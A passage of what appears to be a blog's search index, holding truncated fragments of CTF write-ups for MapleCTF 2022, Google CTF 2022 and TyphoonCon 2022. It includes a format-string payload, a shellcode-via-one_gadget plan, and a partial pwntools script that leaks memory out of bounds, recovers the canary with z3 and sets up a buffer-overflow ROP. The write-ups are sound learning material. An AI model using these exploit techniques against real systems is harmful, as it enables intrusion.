loop payload is %c%c%c%c%c%c%50x%hhn%181x%hhn||%6$p.%7$p.%13$p. One of the important note is that, if we want to do a chain overwrite like this, we aren’t allowed to use any positional parameter at the beginning of it, because when printf see the first positional argument, it will copy the needed arguments to its buffer, so that we won’t be able to do the chain because the next positional argument will refer to the copied buffer, not the overwritten value. For example, if we’re not spamming %c, and instead do ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:3","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Puzzling Oversight We were given a binary called puzzling-oversight and a Dockerfile. Reading through the Dockerfile, the challenge was running under Ubuntu 22.04. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:0","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Initial Analysis Let’s start by checksec the binary first. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RWX: Has RWX segments Hmm RWX segments? Let’s try to run the binary in gdb and check its memory. gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00555f0e89f000 0x00555f0e8a0000 0x00000000000000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a0000 0x00555f0e8a1000 0x00000000001000 r-x /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a1000 0x00555f0e8a2000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a2000 0x00555f0e8a3000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a3000 0x00555f0e8a4000 0x00000000003000 rwx /home/chovid99/ctf/puzzling/puzzling-oversight Ah, turn out the .bss is executable. Let’s try to run the given binary first so that we gain some knowledge about it. ./puzzling-oversight Welcome to the Number Flipper(TM) game v7.27! Options: 1 - play the game 2 - display how to play this game 3 - display game stats 4 - quit \u003e 2 How to play this game: You are given 8 random hexadecimal numbers, which you can increment by any amount (it will wrap around if it's too big); However, the catch is doing so also affects the numbers directly next to it! Your goal is to flip all the numbers to 0s. That's it - simple, right? Options: 1 - play the game 2 - display how to play this game 3 - display game stats 4 - quit \u003e 3 You have won 0 times in the current session. Keep going! Options: 1 - play the game 2 - display how to play this game 3 - display game stats 4 - quit \u003e 1 Board: 4b40 6451 55f4 d4f4 3c8f d13f 76f4 a891 Your move (0 to quit) \u003e 3 Increment how much? \u003e 1 Board: 4b40 6452 55f5 d4f5 3c8f d13f 76f4 a891 Your move (0 to quit) \u003e 0 Seeing through the interaction, the first menu is the only menu that can we use to write something to the memory. The rest isn’t useful. And based on the printed rules, we can see that: Each time we choose an index called idx to be incremented, the value stored in idx-1 and idx+1 will be incremented also. Seems like, the maximum value per index is 0xffff, and it will wrap around when the value gets bigger than that. Let’s start disassembling the binary. The binary method was stripped, but I’ve renamed it to make it clearer. main void main(void) { int iVar1; alarm(0x3c); setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); _DAT_00104060 = menu_play; _DAT_00104068 = menu_rule; _DAT_00104070 = menu_stats; _DAT_00104078 = menu_quit; puts(\"Welcome to the Number Flipper(TM) game v7.27!\\n\"); do { do { puts(\"Options:\"); puts(\"1 - play the game\"); puts(\"2 - display how to play this game\"); puts(\"3 - display game stats\"); puts(\"4 - quit\\n\"); printf(\"\u003e \"); fflush(stdout); iVar1 = read_input(1,4); } while ((long)iVar1 == -1); putchar(10); (**(code **)(\u0026DAT_00104060 + ((long)iVar1 + -1) * 8))(); putchar(10); } while( true ); } From the main menu, notice that: Each of the menu function handler’s pointers is stored under the .bss section During each input in the main menu, the main will call the stored pointer inside the .bss variables based on the input. We just need to check the first menu, because it’s the only important menu that needs to be audited. main_play void menu_play(void) { int iVar1; time_t tVar2; long lVar3; int local_38; int local_34; tVar2 = time((time_t *)0x0); srand((uint)tVar2); local_38 = 4; while (local_38 != 0) { iVar1 = rand(); (\u0026DAT_00104050)[local_38 + -1] = iVar1; local_38 = local_38 + -1; } while ((((DAT_00104050 != 0 || (DAT_00104054 != 0)) || (DAT_00104058 != 0)) || (DAT_0010405c != 0) )) { printf(\"Board: \"); local_34 = 8; while (local_34 != 0) { printf(\"%04x \",(ulong)*(ushort *)((long)\u0026DAT_00104050 + (long)(local_34 + -1) * 2)); local_34 = local_34 + -1; } printf(\"\\nYour move (0 to quit) \u003e \"); fflush(stdout); iVar1 = read_input(0); lVar3 = (long)iVar1; if (lVar3 != -1) { if (lVar3 == 0) { return; } printf(\"Increment how m","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:1","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Exploitation Plan From our initial analysis, the important notes that we took: .bss is RWX We can freely control the board value via the increment method And somehow, there is a bug in the board value’s assignment, which allowed us to replace the last 4 bytes of the menu_play method. So, the idea for solving this challenge is we need to somehow control the increment so that two conditions will be fulfilled, which are: Change the board value to our desired shellcode Change the stored menu_play pointer to the board address (Because it is RWX), so that if we call menu_play, it will run our desired shellcode If the above conditions are fulfilled, the next time we try to call the menu_play’s method for the board’s game, it will give us a shell instead. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:2","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Solution First, we need to solve the puzzle. We need to create a script to determine the correct increment on each index so that the board address will contain our desired value. How to create the script? Well, just use z3 to do it xD. Luckily, during the competition, my teammate daeMOn was sharing his script to complete the z3 logic. Let’s say that our target value is 1337 beef 1337 beef 1337 beef 1337 beef, and the initial value is beef 1337 beef 1337 beef 1337 beef 1337. We can convert this to z3 equations, where: # Below is the total increment on each index that we want to find x1 = BitVec('x1', 16) x2 = BitVec('x2', 16) x3 = BitVec('x3', 16) x4 = BitVec('x4', 16) x5 = BitVec('x5', 16) x6 = BitVec('x6', 16) x7 = BitVec('x7', 16) # Below is the initial state a = BitVecVal(int(numbers[1], 16), 16) b = BitVecVal(int(numbers[2], 16), 16) c = BitVecVal(int(numbers[3], 16), 16) d = BitVecVal(int(numbers[4], 16), 16) e = BitVecVal(int(numbers[5], 16), 16) f = BitVecVal(int(numbers[6], 16), 16) g = BitVecVal(int(numbers[7], 16), 16) # Below is the target state that we want target_7 = BitVecVal(int.from_bytes(payload[:2], \"little\"), 16) target_6 = BitVecVal(int.from_bytes(payload[2:4], \"little\"), 16) target_5 = BitVecVal(int.from_bytes(payload[4:6], \"little\"), 16) target_4 = BitVecVal(int.from_bytes(payload[6:8], \"little\"), 16) target_3 = BitVecVal(int.from_bytes(payload[8:10], \"little\"), 16) target_2 = BitVecVal(int.from_bytes(payload[10:12], \"little\"), 16) target_1 = BitVecVal(int.from_bytes(payload[12:14], \"little\"), 16) # Below is the constraints that we pass to the z3 # Notes that below is the z3 equations that we derive from the game's rule s.add( a + x1 + x2 == target_1, b + x1 + x2 + x3 == target_2, c + x2 + x3 + x4 == target_3, d + x3 + x4 + x5 == target_4, e + x4 + x5 + x6 == target_5, f + x5 + x6 + x7 == target_6, g + x6 + x7 == target_7, ) Notice that even though the max index is 8, we can only have 7 in the z3, which means the max desired value size is 14 bytes. The z3 couldn’t solve the equations if we try to set the target state to 16 bytes, so we concluded that the limit is 14 bytes (where it’s always sat). To execute our plan, first, we will need to craft 14-bytes shellcode. The constraint is pretty short and seems impossible, but luckily during debugging with GDB, I found some good values. First, I was checking the register value right after we do call rdx (which is calling the stored main_play address). Notice that: rbx is 0 rcx contains libc address rdx and rsi isn’t zero yet We’ve already had a libc address in our register for our shellcode. This will help us a lot. But first, let’s try to find out which libc is used by the challenge. How to get the libc? Because we have the Dockerfile, we can simply build it and take the libc.so.6 file from /usr/lib/x86_64-linux-gnu/. Now, let’s use one_gadget to the retrieved libc, to find the shell address and rules to be followed. Below is the result: one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6 0x50a37 posix_spawn(rsp+0x1c, \"/bin/sh\", 0, rbp, rsp+0x60, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL 0xebcf1 execve(\"/bin/sh\", r10, [rbp-0x70]) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL 0xebcf5 execve(\"/bin/sh\", r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xebcf8 execve(\"/bin/sh\", rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL With this, we hoped that jumping to the given gadget can be fitted into the 14-bytes space. Let’s start crafting our shellcode by incrementing/subtracting the stored rcx so that it points to the one_gadget’s result. We use the third gadget (0xebcf8) because using rsi or rdx will decrease the shellcode’s size. sub rcx, 0x28d3f The above line will need 7 bytes, so we can only have 7 bytes more to complete the gadget call. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:3","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":" During this weekend, I played GoogleCTF with my team idek. I managed to solve two challenges, collaborating with my super teammates. We managed to get 20th place 😄 Pwn ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:0:0","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Fixed ASLR I wasn’t happy with the default ASLR, so I fixed it. The flag is in a file called “flag” both in / and cwd. I worked on this challenge together with my teammate pivik. Thanks a lot pivik! ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:0","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a lot of files, where one of them is the main binary called loader, and the rest are object files. Now, let’s try to run the program first so that we can know how the program works. ./loader ______ Welcome to the / ____/___ _____ ___ ___ / / __/ __ `/ __ `__ \\/ _ \\ / /_/ / /_/ / / / / / / __/ \\____/\\__,_/_/ /_/ /_/\\___/ -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 1 Have Fun, Good Luck! Round 1 How much is 0 + 3 ? 3 Yes! +5pts! You have 5pts total. ... [truncated] ... Round 11 How much is 3 + 7 ? 10 Yes! +5pts! You have 55pts total. Round 12 How much is 2 + 9 ? 0 Wrong! Game Over! Congratulations! You're going to the SCOREBOARD! How long is your name (0-31)? 8 Now type in your name: Chovid99 -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? Come again? -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 2 -=*) SCOREBOARD: 0. 95pts --- Gary 1. 90pts --- Yoel 2. 85pts --- Nicholas 3. 80pts --- Vanessa 4. 75pts --- Alice 5. 70pts --- Elizabeth 6. 65pts --- Linda 7. 60pts --- Peter 8. 55pts --- Wayne 9. 55pts --- Chovid99 -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 3 Which place's score do you want to see (0-9)? 0 To get this place you need to beat this score: 95 -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 4 Alright, bye WINNER: Gary Ah okay. Playing around with the binary gave us enough knowledge of how the binary works. We have 4 menus that we can interact: The first menu will start the math game Each correct answer gave you 5 pts If your score is high enough to be placed on the scoreboard, they will ask your name and then store it on the scoreboard The second menu will show the full scoreboard The third menu will show the score value of the scoreboard[input_idx] The fourth menu will exit the game Now we’ve got the idea of how the binary works, let’s try analyzing all of the given files. I use Ghidra as my binary analyzer. Decompilation of game.o Looking around the given file, turn out that most of the above game methods are defined under game.o file. So, let’s try to analyze the game.o file decompiled results to understand better. We can start by checking the menu method, which checking the decompiled version is pretty similar to what we have interacted with before. undefined8 menu(void) { char cVar1; byte bVar2; undefined8 uVar3; long in_FS_OFFSET; undefined local_38 [40]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts( \"\\n-=*) MAIN MENU:\\n 1) Play The Game\\n 2) See full scoreboard\\n 3) See score for place\\n 4) Exit\\nYour choice?\" ); cVar1 = readline(local_38,0x20); if (cVar1 == '\\x01') { bVar2 = atou64(local_38); if (bVar2 == 4) { puts(\"Alright, bye\"); uVar3 = 0; } else { if (bVar2 \u003c 5) { if (bVar2 == 3) { see_scoreboard(); uVar3 = 1; goto LAB_00100829; } if (bVar2 \u003c 4) { if (bVar2 == 1) { game(); uVar3 = 1; goto LAB_00100829; } if (bVar2 == 2) { see_full_scoreboard(); uVar3 = 1; goto LAB_00100829; } } } puts(\"Come again?\"); uVar3 = 1; } } else { uVar3 = 0; } LAB_00100829: if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } From this menu method, we can see that each menu that we chose before, they have its method to handle the menu. Let’s try to check the first main menu decompiled result, which is defined under game method. void game(void) { char cVar1; uint uVar2; char cVar3; char cVar4; long in_FS_OFFSET; long local_68; long local_60; char local_58 [32]; undefined local_38 [40]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Have Fun, Good Luck!\"); local_68 = 0; local_60 = 1; do { print(\"\\nRound \"); u64toa(local_58,local_60); puts(local_58); uVar2 = rand(); cVar3 = (char)uVar2 + (char)(uVar2 / 10) * -10; uVar2 = rand(); cV","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:1","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Now we have finished our initial analysis, we will need to craft a plan. From the above initial analysis, what we have gathered so far: We can leak the canary value if we’re able to retrieve the rand() results of the aslr_get_addr value, which is the aslr base address of each loaded object file region. There is BOF in the get_player_name method. This indicates that to be able to perform ROP, we will need to play the game until we got into the scoreboard + we need canary value. There is OOB in the see_scoreboard method. We need to be able to leak some useful values Hopefully, with this OOB, we can leak the rand() results. Recover rand() value Our first step will be recovering the rand() values which are used as the aslr of each loaded object region. So, let’s try to set up our gdb and then explore how the values are initialized. This is my breakpoint setup b *init_stack_guard+85 b *aslr_get_addr+37 The first breakpoint will be used to get the canary value just for sanity checking. The second breakpoint will be used to retrieve the rand() result of the aslr method. Let’s try stepping on the gdb. $rax : 0x75924ac4cc2d256a $rbx : 0x0 $rcx : 0x3a $rdx : 0x75924ac4cc2d256a $rsp : 0x007fffffffdcb8 → 0x0000000000000008 $rbp : 0x007fffffffdcc8 → 0x007fffffffdcf8 → 0x0000000000000000 $rsi : 0x007ffff7ff8000 → 0x0000000000000000 $rdi : 0x3a $rip : 0x00000000402168 → \u003cinit_stack_guard+85\u003e mov rdi, rax $r8 : 0x0 $r9 : 0x0 $r10 : 0x22 $r11 : 0x206 $r12 : 0x0 $r13 : 0x0 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x007fffffffdcb8│+0x0000: 0x0000000000000008 ← $rsp 0x007fffffffdcc0│+0x0008: 0x007ffff7ff8000 → 0x0000000000000000 0x007fffffffdcc8│+0x0010: 0x007fffffffdcf8 → 0x0000000000000000 ← $rbp 0x007fffffffdcd0│+0x0018: 0x000000004023e8 → \u003c_start+42\u003e mov DWORD PTR [rbp-0x4], 0x0 0x007fffffffdcd8│+0x0020: 0x0000000000000000 0x007fffffffdce0│+0x0028: 0x0000000000000000 0x007fffffffdce8│+0x0030: 0x0000000000000000 0x007fffffffdcf0│+0x0038: 0x0000000000000000 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x402159 \u003cinit_stack_guard+70\u003e call 0x40100d \u003csyscall2\u003e 0x40215e \u003cinit_stack_guard+75\u003e mov edi, 0x40 0x402163 \u003cinit_stack_guard+80\u003e call 0x40146c \u003crand\u003e → 0x402168 \u003cinit_stack_guard+85\u003e mov rdi, rax 0x40216b \u003cinit_stack_guard+88\u003e call 0x401064 \u003cwrite_stack_guard\u003e 0x402170 \u003cinit_stack_guard+93\u003e nop 0x402171 \u003cinit_stack_guard+94\u003e leave 0x402172 \u003cinit_stack_guard+95\u003e ret 0x402173 \u003cpivot_to_main+0\u003e endbr64 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"loader\", stopped 0x402168 in init_stack_guard (), reason: BREAKPOINT ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x402168 → init_stack_guard() ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ We hit our first breakpoint, and rax is the canary value. Let’s continue and take notes on the rax value on each breakpoint because it is the rand() result. I won’t display the result here because it’s too long. After stepping 7 times, these are the rand() consecutive results (which are retrieved from rax values on each break). 0x42f, 0xf90, 0x97e, 0x7ab, 0xc92, 0x6fe, 0xf0b Now, let’s check the vmmap to confirm that this 12-bits number is indeed used as the base address of each loaded object. gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000042f0000000 0x000042f0002000 0x00000000000000 r-x 0x00004","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:2","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Solution Following the above exploitation plan, below is the full script that I used to execute the plan. I’ve provided detailed comments to explain what the script does. Info Notes that sometimes z3 couldn’t recover the correct canary value, but we simply retry it, and at somepoint, it will be able to recover the correct canary. from pwn import * from pwn import p64, u64, p32, u32 from z3 import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # Helper method to execute the OOB bug def oob(r, offset): r.sendlineafter(b'Your choice?\\n', b'3') r.sendlineafter(b'see (0-9)?\\n', str(offset).encode()) r.recvuntil(b'score: ') return int(r.recvuntil(b'\\n').strip()) # Helper method to put our score into the scoreboard # and put our BOF payload def play(r, n, payload): r.sendlineafter(b'Your choice?\\n', b'1') for i in range(n): r.recvuntil(b'How much is ') out = r.recvuntil(b' ?\\n').strip()[:-2] ans = eval(out) log.info(f'Question-{i+1}: {out.decode()} = {ans}') r.sendline(str(ans).encode()) r.recvuntil(b'How much is ') out = r.recvuntil(b' ?\\n').strip()[:-2] ans = eval(out)+5 # Make it false log.info(f'Question-{i+2}: {out.decode()} = {ans}') r.sendline(str(ans).encode()) r.sendlineafter(b'(0-31)?\\n', str(len(payload)).encode()) r.sendafter(b'your name:', payload) r.interactive() def conn(): if args.LOCAL: r = process(['./loader'], env={}) if args.PLT_DEBUG: gdb.attach(r, gdbscript='''''') else: r = remote(b'fixedaslr.2022.ctfcompetition.com', 1337) return r r = conn() ''' Recover the rand_state during the first rand() call of aslr_get_addr, which equivalent to the canary value set by init_stack_guard method. We use the OOB bug on scoreboard. Notes that we can only recover 6 of rand() result of the aslr_get_addr method. Each rand() return 12-bit number, which is used as the first 12-bits of each address those used by each object file in this challenge. ''' known_states = [0, 0, 0, 0, 0, 0] # Inspecting via gdb, offset 512 will give us the 1st rand() # result of the aslr_get_addr (taking the first 12-bits only) base_1 = oob(r, 512) known_states[0] = base_1 \u003e\u003e 28 # Inspecting via gdb, offset -1017 will give us the 3rd rand() # result of the aslr_get_addr (taking the first 12-bits only) known_states[2] = oob(r, 2**64-1017) \u003e\u003e 28 # Inspecting via gdb, offset -1019 will give us the 5th rand() # result of the aslr_get_addr (taking the first 12-bits only) base_5 = oob(r, 2**64-1019) known_states[4] = base_5 \u003e\u003e 28 # Inspecting via gdb, one of the address in region started with the 5th result # of the rand() contains an address which the first 12-bits is # the result of the 4th rand() offset_4 = int(((base_5-0x1000+8)-(base_1-0x60)) // 8) if offset_4 \u003c 0: offset_4 = 2**64 + offset_4 base_4 = oob(r, offset_4) known_states[3] = base_4 \u003e\u003e 28 # Inspecting via gdb, one of the address in region started with the 5th result # of the rand() also contains an address which the first 12-bits is # the result of the 6th rand() offset_6 = int(((base_5+0x1000)-(base_1-0x60)) // 8) if offset_6 \u003c 0: offset_6 = 2**64 + offset_6 base_6 = oob(r, offset_6) known_states[5] = base_6 \u003e\u003e 28 # Inspecting via gdb, one of the address in region started with the 4th result # of the rand() also contains an address which the first 12-bits is # the result of the 2nd rand() offset_2 = int(((((base_4 \u003e\u003e 16) \u003c\u003c 16) + 0x38)-(base_1-0x60)) // 8) base_2 = oob(r, offset_2) known_states[1] = base_2 \u003e\u003e 28 # Now we have 6 consecutives rand() result, we will try to recover # the rand_state before the first rand(), which equivalents to # the binary canary value. # We use z3 to solve it. s = Solver() log.info(f'Known states: {known_states}') rand_state = BitVec(\"x\", 64) def rand_extract_bit(a): global rand_state return (rand_state \u003e\u003e a) \u0026 1 def rand_get_bit(): global rand_state x = ( rand_extract_bit(0x3F) ^ rand_extract_bit(0x3D) ^ rand_extract_bit(0x3C) ^ rand_extract_bit(0x3A) ^ 1 ) rand_state = ((rand_state \u003c\u003c 1) % (2**64)) ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:3","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Appnote.txt Every single archive manager unpacks this to a different file… ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:2:0","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Analysis \u0026 Solution We were given a zip file called dump.zip. Trying to extract it, I found that the size of the file’s output doesn’t make sense. So, let’s try to open it in a hex editor. Turn out, as you can see, there are a lot of zip files on there. What makes it more interesting is there are a lot of zip files with the same name (Example: there is a lot of flag00.zip in the file), but with different contents. There are flag00.zip - flag18.zip. Each zip file with the same name contains only one char. In fact, the name indicates the n-th character of the flags. So, with deduction, we can guess that: To get the flag n-th character, we need to know which flag{n}.zip is the correct zip. If we found it, that means the content of its zip is the n-th character of our flag But how do we know the correct zip file? Reading through the appnote.txt of the ZIP file, we can understand how the ZIP signatures work, especially in part 4.3.1 4.3.1 A ZIP file MUST contain an \"end of central directory record\". A ZIP file containing only an \"end of central directory record\" is considered an empty ZIP file. Files MAY be added or replaced within a ZIP file, or deleted. A ZIP file MUST have only one \"end of central directory record\". Other records defined in this specification MAY be used as needed to support storage requirements for individual ZIP files. Now, let’s check the signature of the end of the central directory record 4.3.16 End of central directory record: end of central dir signature 4 bytes (0x06054b50) number of this disk 2 bytes number of the disk with the start of the central directory 2 bytes total number of entries in the central directory on this disk 2 bytes total number of entries in the central directory 2 bytes size of the central directory 4 bytes offset of start of central directory with respect to the starting disk number 4 bytes .ZIP file comment length 2 bytes .ZIP file comment (variable size) Okay, so the signature is started by 0x06054b50. Searching this pattern in HxD, turn out it gives 21 results. 50 4B 05 06 00 00 00 00 01 00 01 00 00 EE 00 00 CC 00 00 00 B8 01 50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01 50 4B 05 06 00 00 00 00 01 00 01 00 93 D7 00 00 65 17 00 00 8C 01 50 4B 05 06 00 00 00 00 01 00 01 00 CC CA 00 00 42 24 00 00 76 01 50 4B 05 06 00 00 00 00 01 00 01 00 69 BF 00 00 BB 2F 00 00 60 01 50 4B 05 06 00 00 00 00 01 00 01 00 CE B6 00 00 6C 38 00 00 4A 01 50 4B 05 06 00 00 00 00 01 00 01 00 29 A5 00 00 27 4A 00 00 34 01 50 4B 05 06 00 00 00 00 01 00 01 00 E7 9C 00 00 7F 52 00 00 1E 01 50 4B 05 06 00 00 00 00 01 00 01 00 42 8B 00 00 3A 64 00 00 08 01 50 4B 05 06 00 00 00 00 01 00 01 00 21 86 00 00 71 69 00 00 F2 00 50 4B 05 06 00 00 00 00 01 00 01 00 71 73 00 00 37 7C 00 00 DC 00 50 4B 05 06 00 00 00 00 01 00 01 00 66 70 00 00 58 7F 00 00 C6 00 50 4B 05 06 00 00 00 00 01 00 01 00 E3 59 00 00 F1 95 00 00 B0 00 50 4B 05 06 00 00 00 00 01 00 01 00 AC 52 00 00 3E 9D 00 00 9A 00 50 4B 05 06 00 00 00 00 01 00 01 00 A2 47 00 00 5E A8 00 00 84 00 50 4B 05 06 00 00 00 00 01 00 01 00 8E 33 00 00 88 BC 00 00 6E 00 50 4B 05 06 00 00 00 00 01 00 01 00 9A 2A 00 00 92 C5 00 00 58 00 50 4B 05 06 00 00 00 00 01 00 01 00 16 1C 00 00 2C D4 00 00 42 00 50 4B 05 06 00 00 00 00 01 00 01 00 38 15 00 00 20 DB 00 00 2C 00 50 4B 05 06 00 00 00 00 01 00 01 00 2F 02 00 00 3F EE 00 00 16 00 50 4B 05 06 00 00 00 00 01 00 01 00 34 F0 00 00 50 00 00 00 00 00 This makes sense, as technically, there is 21 zip in the given file. dump.zip contains hello.txt a zip contains hi.txt 19 zips flag{n}.zip With this end of the central directory, we can know which zip is the correct one. Notice that each end of the central directory has 4-bytes which is the offset of the start of the central directory of the file. With this, we can know which zip is the correct one for each n-th character of the flag. Example: 50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01 Checking the 0A88-0x1 offset, it refers to the correct ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:2:1","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":" TyphoonCon CTF 2022 During the weekdays, I spent my after work time by working on the TyphoonCon CTF challenge, specifically See you Allocator challenge. This is my first time doing a browser pwn challenge, so I wrote this writeup for my future-self and as a training for me to understand it better. I apologize in advance if there is any mistake on my explanation, and feel free to correct me if i’m wrong. Disclaimer Until now, I honestly don’t know the intended solution that the authors want (because there are unintended solution which we can directly read the file with the js shell interpreter). But assuming this is like the normal browser pwn challenge, I set on my mind that the intended solution for this chall is to be able get RCE. Pwn ","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:0:0","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"See you Allocator On this challenge, we were given 2 info, the hash commit for the firefox repo and the challenge patch. ","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:0","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"Initial Analysis This is my first time doing browser pwn, so maybe the best way for me is to setup the environment first. Environment Setup Reading through this article, below is how we setup and build the js shell. git clone https://github.com/mozilla/gecko-dev.git cd gecko-dev git checkout c1598f6d3edad19ccc53f53ab045d1d29835e1dd git apply ../challenge.patch cp configure.in configure \u0026\u0026 autoconf2.13 mkdir build_NODBG.OBJ cd build_NODBG.OBJ ../configure --disable-debug --disable-optimize make Usually for browser pwn challenge, AFAIK, one of the attack vector is usually the js shell (which is for Firefox, it is powered with SpiderMonkey engine). This will build a binary called js under the dist/bin folder. Notes that we build the non-debug js shell. Analyzing the patch and source code After successfully build the binary, not it’s time for us to read the source code first. Let’s start by reading the patchfile. challenge.patch From 9b75f0de94978a681682cf13d392b0db7fa4161a Mon Sep 17 00:00:00 2001 From: Your Name \u003cyou@example.com\u003e Date: Thu, 17 Feb 2022 16:09:17 +0000 Subject: [PATCH] Cool new Implementation --- js/src/gc/Nursery.cpp | 4 +++- 1 file changed, 3 insertions(+), 1 deletion(-) diff --git a/js/src/gc/Nursery.cpp b/js/src/gc/Nursery.cpp index ef75e814ed..59ac8e5872 100644 --- a/js/src/gc/Nursery.cpp +++ b/js/src/gc/Nursery.cpp @@ -701,12 +701,14 @@ void* js::Nursery::reallocateBuffer(Zone* zone, Cell* cell, void* oldBuffer, return newBuffer; } + void* newBuffer = allocateBuffer(zone, newBytes); + // The nursery cannot make use of the returned slots data. if (newBytes \u003c oldBytes) { + position_ -= oldBytes; return oldBuffer; } - void* newBuffer = allocateBuffer(zone, newBytes); if (newBuffer) { PodCopy((uint8_t*)newBuffer, (uint8_t*)oldBuffer, oldBytes); } -- 2.20.1 Okay, so the patch is applied to the Nursery.cpp file. To understand it better, let’s try to read the method’s code. Nursery.cpp void* js::Nursery::reallocateBuffer(Zone* zone, Cell* cell, void* oldBuffer, size_t oldBytes, size_t newBytes) { if (!IsInsideNursery(cell)) { return zone-\u003epod_realloc\u003cuint8_t\u003e((uint8_t*)oldBuffer, oldBytes, newBytes); } if (!isInside(oldBuffer)) { MOZ_ASSERT(mallocedBufferBytes \u003e= oldBytes); void* newBuffer = zone-\u003epod_realloc\u003cuint8_t\u003e((uint8_t*)oldBuffer, oldBytes, newBytes); if (newBuffer) { if (oldBuffer != newBuffer) { MOZ_ALWAYS_TRUE( 